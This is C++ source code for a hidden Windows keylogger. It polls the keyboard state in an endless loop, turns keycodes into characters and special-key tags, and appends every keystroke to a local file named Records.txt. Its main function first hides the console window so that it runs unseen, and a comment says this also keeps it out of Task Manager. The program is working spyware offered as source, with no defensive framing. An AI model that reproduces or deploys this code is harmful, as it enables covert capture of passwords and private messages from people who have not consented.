

#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;



void listenForKeys () //PROGRAM TO GATHER THE INPUT FROM KEYBOARD
{
	unsigned char c;

	for(;;)
	{
		for (c=8;c<= VK_OEM_7 ;c++)
		{
			if (GetAsyncKeyState(c)== -32767)
			{
				std::ofstream write("Records.txt",ios::app);
                
                if (!GetAsyncKeyState(0x10)&&(c>64 &&c<91))  // TO CHECK SHIFT IS PRESSED
                {
                	c+=32;
                	write << c;
                	write.close();
                	break;
                }
                else if((c>64) && (c<91)&&GetAsyncKeyState(0x10))
                {
                	write <<c;
                	write.close();
                	break;
                }

				else
				{
					switch (c)                                           //SPECIAL CHARACTERS
					{
					case 48: {
						if (GetAsyncKeyState(0x10))write << ")";
						else write << "0";
						break;
					}
					case 49: {
						if (GetAsyncKeyState(0x10))write << "!";
						else write << "1";
						break;
					}
					case 50: {
						if (GetAsyncKeyState(0x10))write << "@";
						else write << "2";
						break;
					}
					case 51: {
						if (GetAsyncKeyState(0x10))write << "#";
						else write << "3";
						break;
					}
					case 52: {
						if (GetAsyncKeyState(0x10))write << "$";
						else write << "4";
						break;
					}
					case 53: {
						if (GetAsyncKeyState(0x10))write << "%";
						else write << "5";
						break;
					}
					case 54: {
						if (GetAsyncKeyState(0x10))write << "^";
						else write << "6";
						break;
					}
					case 55: {
						if (GetAsyncKeyState(0x10))write << "&";
						else write << "7";
						break;
					}
					case 56: {
						if (GetAsyncKeyState(0x10))write << "*";
						else write << "8";
						break;
					}
					case 57: {
						if (GetAsyncKeyState(0x10))write << "(";
						else write << "9";
						break;
					}
					case VK_OEM_COMMA: {
						if (GetAsyncKeyState(0x10))write << "<";
						else write << ";";
						break;
					}

					case VK_OEM_PERIOD: {
						if (GetAsyncKeyState(0x10))write << ">";
						else write << ".";
						break;
					}

					case VK_OEM_MINUS: {
						if (GetAsyncKeyState(0x10))write << "_";
						else write << "-";
						break;
					}

					case VK_OEM_PLUS: {
						if (GetAsyncKeyState(0x10))write << "+";
						else write << "=";
						break;
					}
					case VK_OEM_1: {
						if (GetAsyncKeyState(0x10))write << ":";
						else write << ";";
						break;
					}
					case VK_OEM_2: {
						if (GetAsyncKeyState(0x10))write << "?";
						else write << "/";
						break;
					}
					case VK_OEM_3: {
						if (GetAsyncKeyState(0x10))write << "~";
						else write << "`";
						break;
					}
					case VK_OEM_4: {
						if (GetAsyncKeyState(0x10))write << "{";
						else write << "[";
						break;
					}
					case VK_OEM_5: {
						if (GetAsyncKeyState(0x10))write << "|";
						else write << "\\";
						break;
					}
					case VK_OEM_6: {
						if (GetAsyncKeyState(0x10))write << "}";
						else write << "]";
						break;
					}
					case VK_OEM_7: {
						if (GetAsyncKeyState(0x10))write << "\"";
						else write << "'";
						break;
					}

					case VK_ADD: {
						if (GetAsyncKeyState(0x10))write << "+";
						else write << "=";
						break;
					}
					case VK_SPACE: {
						write << " ";
						break;
					}
					case VK_RETURN: {
						write << "\n";
						break;
					}
					case VK_TAB: {
						write << "<TAB>";
						break;
					}
					case VK_BACK: {
						write << "<BACKSPACE>";
						break;
					}
					case VK_ESCAPE: {
						write << "<ESC>";
						break;
					}
					case VK_DELETE: {
						write << "<DEL>";
						break;
					}
					case VK_UP: {
						write << "<UP>";
						break;
					}
					case VK_DOWN: {
						write << "<DOWN>";
						break;
					}
					case VK_LEFT: {
						write << "<LEFT>";
						break;
					}
					case VK_RIGHT: {
						write << "<RIGHT>";
						break;
					}
					case VK_CONTROL: {
						write << "<CTRL>";
						break;
					}
					case VK_CAPITAL: {
						write << "<CAPS_LOCK>";
						break;
					}
					}
				}
			}
		}
	}
}
void hideConsoleWindow()           
{
    /*::ShowWindow(::GetConsoleWindow(), SW_HIDE);*/  // HIDES ALSO THE SERVICE IN TASK MANAGER
	HWND consoleWindow;
	AllocConsole();
	consoleWindow = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(consoleWindow, 0);

}


int main ()
{
	hideConsoleWindow();
	listenForKeys();
	return(0);
}